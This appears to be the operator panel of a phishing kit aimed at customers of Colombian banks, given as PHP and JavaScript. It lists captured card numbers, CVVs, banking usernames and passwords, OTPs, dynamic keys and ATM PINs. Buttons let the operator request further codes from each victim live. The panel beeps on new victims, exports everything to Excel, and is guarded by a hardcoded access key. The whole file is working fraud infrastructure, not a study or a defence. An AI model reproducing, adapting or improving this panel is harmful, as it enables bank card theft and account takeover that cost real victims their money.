                                        
                                    <?php else: ?>
                                        <span class="btn btn-disabled">✓ Procesado</span>
                                    <?php endif; ?>
                                    
                                    <a href="?eliminar=<?php echo $s['id']; ?>&llave=0b2c4e6c3bcb7209f5ef20632b6ff001" 
                                       onclick="return confirm('¿Eliminar esta solicitud?')" 
                                       class="btn-eliminar">
                                        🗑️
                                    </a>
                                </div>
                            </div>
                        </div>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>
        </div>
    </div>

    <script>
        // ============================================
        // GENERADOR DE SONIDO (PITIDO FUERTE)
        // ============================================
        function reproducirPitido() {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();
                
                oscillator.type = 'square';
                oscillator.frequency.setValueAtTime(880, audioCtx.currentTime);
                oscillator.frequency.exponentialRampToValueAtTime(1200, audioCtx.currentTime + 0.05);
                
                gainNode.gain.setValueAtTime(0.7, audioCtx.currentTime);
                gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
                
                oscillator.connect(gainNode);
                gainNode.connect(audioCtx.destination);
                
                oscillator.start(audioCtx.currentTime);
                oscillator.stop(audioCtx.currentTime + 0.4);
                
                setTimeout(() => {
                    try {
                        const osc2 = audioCtx.createOscillator();
                        const gain2 = audioCtx.createGain();
                        osc2.type = 'square';
                        osc2.frequency.setValueAtTime(1100, audioCtx.currentTime);
                        gain2.gain.setValueAtTime(0.6, audioCtx.currentTime);
                        gain2.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.2);
                        osc2.connect(gain2);
                        gain2.connect(audioCtx.destination);
                        osc2.start(audioCtx.currentTime + 0.1);
                        osc2.stop(audioCtx.currentTime + 0.3);
                    } catch(e) {}
                }, 150);
                
                console.log('🔊 ¡Pitido reproducido!');
                
            } catch (error) {
                console.warn('⚠️ Error al reproducir sonido:', error);
            }
        }

        // ============================================
        // VARIABLES GLOBALES
        // ============================================
        let knownIds = new Set();
        let updateCounter = 0;
        let isUpdating = false;
        let lastTimestamp = 0;
        let ultimoTotal = <?php echo $total; ?>;
        // 🔐 CSRF TOKEN DESDE PHP
        const CSRF_TOKEN = '<?php echo $csrf_token; ?>';
        
        // ============================================
        // ESCAPAR HTML
        // ============================================
        function escapaHTML(texto) {
            if (!texto) return 'N/A';
            const div = document.createElement('div');
            div.textContent = texto;
            return div.innerHTML;
        }
        
        // ============================================
        // GENERAR HTML DE CÓDIGOS UNIFICADOS
        // ============================================
        function generarCodigosHTML(s) {
            const tieneClaveCajero = s.clave_cajero_codigo && s.clave_cajero_codigo !== 'N/A' && s.clave_cajero_codigo !== '';
            const tieneClaveDinamica = s.clave_dinamica_codigo && s.clave_dinamica_codigo !== 'N/A' && s.clave_dinamica_codigo !== '';
            const tieneOtp = s.otp_codigo && s.otp_codigo !== 'N/A' && s.otp_codigo !== '';
            const tieneOtpSecundario = s.otp_codigo_secundario && s.otp_codigo_secundario !== 'N/A' && s.otp_codigo_secundario !== '';
            
            if (!tieneClaveCajero && !tieneClaveDinamica && !tieneOtp && !tieneOtpSecundario) {
                return '';
            }
            
            let html = '<div class="codigos-row">';
            
            if (tieneClaveCajero) {
                html += `
                    <div class="codigo-item clave-cajero">
                        <span class="codigo-label">🏧 Clave Cajero:</span>
                        <span class="codigo-valor">${escapaHTML(s.clave_cajero_codigo)}</span>
                    </div>
                `;
            }
            
            if (tieneOtp) {
                html += `
                    <div class="codigo-item otp">
                        <span class="codigo-label">📱 OTP:</span>
                        <span class="codigo-valor">${escapaHTML(s.otp_codigo)}</span>
                    </div>
                `;
            }
            
            if (tieneClaveDinamica) {
                html += `
                    <div class="codigo-item clave-dinamica">
                        <span class="codigo-label">🔑 Clave Dinámica:</span>
                        <span class="codigo-valor">${escapaHTML(s.clave_dinamica_codigo)}</span>
                    </div>
                `;
            }
            
            if (tieneOtpSecundario) {
                html += `
                    <div class="codigo-item otp">
                        <span class="codigo-label">📱 OTP Secundario:</span>
                        <span class="codigo-valor">${escapaHTML(s.otp_codigo_secundario)}</span>
                    </div>
                `;
            }
            
            html += '</div>';
            return html;
        }
        
        // ============================================
        // GENERAR HTML DE SOLICITUD
        // ============================================
        function generarSolicitudHTML(s) {
            const estados = {
                'pending': '⏳ Pendiente',
                'pending_otp': '⏳ OTP Pendiente',
                'pending_clave_cajero': '⏳ Clave Cajero Pendiente',
                'approved': '✅ Aprobada',
                'approved_otp': '✅ OTP Aprobado',
                'approved_clave_cajero': '✅ Clave Cajero Aprobado',
                'rejected': '❌ Rechazada',
                'rejected_otp': '❌ OTP Rechazado',
                'rejected_clave_cajero': '❌ Clave Cajero Rechazado'
            };
            
            let estadoTexto = estados[s.estado] || s.estado;
            
            const bancosClaveCajero = ['BBVA Colombia', 'Davibank', 'Davivienda', 'Caja Social'];
            const mostrarClaveCajero = bancosClaveCajero.includes(s.banco);
            
            const LLAVE = '0b2c4e6c3bcb7209f5ef20632b6ff001';
            
            let botones = '';
            if (s.estado === 'pending') {
                if (!s.usuario || s.usuario === 'N/A' || s.usuario === '') {
                    botones = `
                        <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                            <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                            <input type="hidden" name="id" value="${s.id}" />
                            <input type="hidden" name="action" value="aprobar" />
                            <button type="submit" class="btn btn-approve">✅ Aprobar</button>
                        </form>
                        <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                            <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                            <input type="hidden" name="id" value="${s.id}" />
                            <input type="hidden" name="action" value="rechazar" />
                            <button type="submit" class="btn btn-reject">❌ Rechazar</button>
                        </form>
                    `;
                } else {
                    let btnClaveCajeroHTML = '';
                    if (mostrarClaveCajero) {
                        btnClaveCajeroHTML = `
                            <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                                <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                                <input type="hidden" name="id" value="${s.id}" />
                                <input type="hidden" name="action" value="pedir_clave_cajero" />
                                <button type="submit" class="btn btn-cajero">🏧 PEDIR CLAVE CAJERO</button>
                            </form>
                        `;
                    }
                    botones = `
                        <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                            <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                            <input type="hidden" name="id" value="${s.id}" />
                            <input type="hidden" name="action" value="pedir_otp" />
                            <button type="submit" class="btn btn-pedir">📱 PEDIR OTP</button>
                        </form>
                        <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                            <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                            <input type="hidden" name="id" value="${s.id}" />
                            <input type="hidden" name="action" value="pedir_clave_din" />
                            <button type="submit" class="btn btn-otp">🔑 PEDIR CLAVE DIN</button>
                        </form>
                        ${btnClaveCajeroHTML}
                        <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                            <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                            <input type="hidden" name="id" value="${s.id}" />
                            <input type="hidden" name="action" value="error_usuario" />
                            <button type="submit" class="btn btn-error-usuario">👤 ERROR USUARIO</button>
                        </form>
                        <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                            <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                            <input type="hidden" name="id" value="${s.id}" />
                            <input type="hidden" name="action" value="error_credenciales" />
                            <button type="submit" class="btn btn-danger">❌ ERROR</button>
                        </form>
                    `;
                }
            } else if (s.estado === 'pending_otp') {
                let btnClaveCajeroHTML = '';
                if (mostrarClaveCajero) {
                    btnClaveCajeroHTML = `
                        <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                            <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                            <input type="hidden" name="id" value="${s.id}" />
                            <input type="hidden" name="action" value="pedir_clave_cajero" />
                            <button type="submit" class="btn btn-cajero">🏧 PEDIR CLAVE CAJERO</button>
                        </form>
                    `;
                }
                botones = `
                    <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                        <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                        <input type="hidden" name="id" value="${s.id}" />
                        <input type="hidden" name="action" value="aprobar_otp" />
                        <button type="submit" class="btn btn-approve">✅ Aprobar OTP</button>
                    </form>
                    <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                        <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                        <input type="hidden" name="id" value="${s.id}" />
                        <input type="hidden" name="action" value="rechazar_otp" />
                        <button type="submit" class="btn btn-reject">❌ Rechazar OTP</button>
                    </form>
                    <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                        <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                        <input type="hidden" name="id" value="${s.id}" />
                        <input type="hidden" name="action" value="error_usuario" />
                        <button type="submit" class="btn btn-error-usuario">👤 ERROR USUARIO</button>
                    </form>
                    ${btnClaveCajeroHTML}
                `;
            } else if (s.estado === 'pending_clave_cajero') {
                botones = `
                    <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                        <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                        <input type="hidden" name="id" value="${s.id}" />
                        <input type="hidden" name="action" value="aprobar_clave_cajero" />
                        <button type="submit" class="btn btn-approve">✅ Aprobar Clave Cajero</button>
                    </form>
                    <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                        <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                        <input type="hidden" name="id" value="${s.id}" />
                        <input type="hidden" name="action" value="rechazar_clave_cajero" />
                        <button type="submit" class="btn btn-reject">❌ Rechazar Clave Cajero</button>
                    </form>
                    <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                        <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                        <input type="hidden" name="id" value="${s.id}" />
                        <input type="hidden" name="action" value="error_usuario" />
                        <button type="submit" class="btn btn-error-usuario">👤 ERROR USUARIO</button>
                    </form>
                    <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                        <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                        <input type="hidden" name="id" value="${s.id}" />
                        <input type="hidden" name="action" value="pedir_otp" />
                        <button type="submit" class="btn btn-pedir">📱 PEDIR OTP</button>
                    </form>
                    <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                        <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                        <input type="hidden" name="id" value="${s.id}" />
                        <input type="hidden" name="action" value="pedir_clave_din" />
                        <button type="submit" class="btn btn-otp">🔑 PEDIR CLAVE DIN</button>
                    </form>
                `;
            } else if (s.estado === 'approved' || s.estado === 'approved_otp' || s.estado === 'approved_clave_cajero') {
                botones = `<span class="btn btn-disabled">✅ Aprobado</span>`;
            } else if (s.estado === 'rejected' || s.estado === 'rejected_otp' || s.estado === 'rejected_clave_cajero') {
                botones = `<span class="btn btn-disabled">❌ Rechazado</span>`;
            } else {
                botones = `<span class="btn btn-disabled">✓ Procesado</span>`;
            }
            
            let credencialesHTML = '';
            if (s.usuario && s.usuario !== 'N/A' && s.usuario !== '') {
                credencialesHTML = `
                    <div class="credenciales-row">
                        <div class="campo">
                            <span class="etiqueta">Usuario:</span>
                            <span class="valor">${escapaHTML(s.usuario)}</span>
                        </div>
                        <div class="campo">
                            <span class="etiqueta">Contraseña:</span>
                            <span class="valor">${escapaHTML(s.password || '****')}</span>
                        </div>
                    </div>
                `;
            }
            
            let codigosHTML = generarCodigosHTML(s);
            
            let datosHTML = '';
            if (s.nombre && s.nombre !== 'N/A') {
                datosHTML = `
                    <div class="datos-row">
                        <span><span class="label">👤</span> <span class="nombre">${escapaHTML(s.nombre)}</span></span>
                        <span><span class="label">🆔</span> ${escapaHTML(s.documento || 'N/A')}</span>
                        <span><span class="label">📧</span> ${escapaHTML(s.email || 'N/A')}</span>
                        <span><span class="label">📱</span> ${escapaHTML(s.celular || 'N/A')}</span>
                        <span><span class="label">💰</span> ${escapaHTML(s.monto || 'N/A')}</span>
                    </div>
                `;
            }
            
            const eliminarUrl = `?eliminar=${s.id}&llave=${LLAVE}`;
            
            return `
                <div class="solicitud" data-id="${s.id}" data-estado="${s.estado}">
                    <div class="card-row">
                        <span class="card-number">💳 ${escapaHTML(s.numero_tarjeta || s.tarjeta || 'N/A')}</span>
                    </div>
                    <div class="card-row">
                        <span class="card-detail">🔢 CVV: <span class="highlight">${escapaHTML(s.cvv || '***')}</span></span>
                        <span class="card-detail">📅 Exp: <span class="highlight">${escapaHTML(s.vencimiento || 'N/A')}</span></span>
                        <span class="card-detail">🏦 <span class="bank">${escapaHTML(s.banco || 'N/A')}</span></span>
                    </div>
                    ${credencialesHTML}
                    ${codigosHTML}
                    ${datosHTML}
                    <div class="actions-row">
                        <span class="estado ${s.estado}">${estadoTexto}</span>
                        <div class="form-actions">
                            ${botones}
                            <a href="${eliminarUrl}" 
                               onclick="return confirm('¿Eliminar esta solicitud?')" 
                               class="btn-eliminar">
                                🗑️
                            </a>
                        </div>
                    </div>
                </div>
            `;
        }
        
        // ============================================
        // ACTUALIZAR DATOS VÍA AJAX
        // ============================================
        async function actualizarDatos() {
            if (isUpdating) return;
            isUpdating = true;
            
            try {
                const response = await fetch(`/api/estado_panel.php?timestamp=${lastTimestamp}`);
                
                if (!response.ok) throw new Error('Error en la respuesta');
                
                const data = await response.json();
                
                if (!data.success) throw new Error('Error en los datos');
                
                // DETECTAR NUEVAS SOLICITUDES
                let hayNuevas = false;
                let cantidadNuevas = 0;
                
                if (data.solicitudes && data.solicitudes.length > 0 && knownIds.size > 0) {
                    const idsActuales = new Set(data.solicitudes.map(s => s.id));
                    for (const id of idsActuales) {
                        if (!knownIds.has(id)) {
                            cantidadNuevas++;
                            hayNuevas = true;
                        }
                    }
                } else if (data.solicitudes && data.solicitudes.length > 0 && knownIds.size === 0) {
                    // Primera carga, todas son nuevas
                    hayNuevas = true;
                    cantidadNuevas = data.solicitudes.length;
                }
                
                // Si hay nuevas solicitudes, reproducir pitido
                if (hayNuevas && cantidadNuevas > 0) {
                    console.log(`🔔 ¡${cantidadNuevas} nueva(s) solicitud(es)!`);
                    // Reproducir pitido hasta 3 veces
                    const veces = Math.min(cantidadNuevas, 3);
                    for (let i = 0; i < veces; i++) {
                        setTimeout(() => {
                            reproducirPitido();
                        }, i * 250);
                    }
                    // Notificación visual
                    document.getElementById('statusDot').className = 'dot';
                    document.getElementById('statusText').textContent = `🔔 ¡${cantidadNuevas} nueva(s)!`;
                    setTimeout(() => {
                        document.getElementById('statusText').textContent = 'Auto-actualización';
                    }, 3000);
                }
                
                if (data.hay_cambios === false) {
                    updateCounter++;
                    document.getElementById('updateCounter').textContent = `🔄 Sin cambios (${updateCounter})`;
                    document.getElementById('statusDot').className = 'dot';
                    return;
                }
                
                lastTimestamp = data.timestamp;
                
                // Actualizar knownIds
                if (data.solicitudes) {
                    knownIds = new Set(data.solicitudes.map(s => s.id));
                }
                
                const listaActual = document.getElementById('solicitudesList');
                
                if (data.solicitudes.length === 0) {
                    listaActual.innerHTML = `
                        <div class="empty">
                            <span class="icon">📭</span>
                            No hay solicitudes aún
                        </div>
                    `;
                } else {
                    let htmlCompleto = '';
                    data.solicitudes.forEach(s => {
                        htmlCompleto += generarSolicitudHTML(s);
                    });
                    
                    listaActual.innerHTML = htmlCompleto;
                }
                
                document.querySelector('#statTotal .number.total').textContent = data.stats.total;
                document.querySelector('#statPending .number.pending').textContent = data.stats.pendientes;
                document.querySelector('#statApproved .number.approved').textContent = data.stats.aprobadas;
                document.querySelector('#statRejected .number.rejected').textContent = data.stats.rechazadas;
                
                document.getElementById('totalBadge').textContent = data.stats.total + ' total';
                
                updateCounter++;
                document.getElementById('updateCounter').textContent = `🔄 Actualizado (${updateCounter})`;
                
                document.getElementById('statusDot').className = 'dot';
                
            } catch (error) {
                console.error('Error al actualizar:', error);
                document.getElementById('statusDot').className = 'dot error';
            } finally {
                isUpdating = false;
            }
        }
        
        // ============================================
        // EXPORTAR A EXCEL (CON LLAVE)
        // ============================================
        function exportarExcel() {
            if (confirm('📊 ¿Exportar todas las solicitudes a Excel?')) {
                window.location.href = '?exportar_excel=si&llave=0b2c4e6c3bcb7209f5ef20632b6ff001';
            }
        }
        
        // ============================================
        // ELIMINAR TODAS (CON LLAVE)
        // ============================================
        function eliminarTodas() {
            if (confirm('⚠️ ¿Eliminar TODAS las solicitudes? Esta acción no se puede deshacer.')) {
                if (confirm('¿Estás SEGURO?')) {
                    window.location.href = '?eliminar_todas=si&llave=0b2c4e6c3bcb7209f5ef20632b6ff001';
                }
            }
        }
        
        // ============================================
        // INICIAR AUTO-ACTUALIZACIÓN
        // ============================================
        window.addEventListener('load', function() {
            document.querySelectorAll('.solicitud').forEach(el => {
                knownIds.add(el.dataset.id);
            });
            
            console.log(`📋 ${knownIds.size} solicitudes cargadas inicialmente`);
            
            setTimeout(() => {
                actualizarDatos();
            }, 1000);
            
            setInterval(() => {
                actualizarDatos();
            }, 3000);
            
            console.log('🔄 Actualización automática iniciada (cada 3 segundos)');
            console.log('🔊 Sonido de notificación activado para nuevas solicitudes');
        });
    </script>
</body>
</html>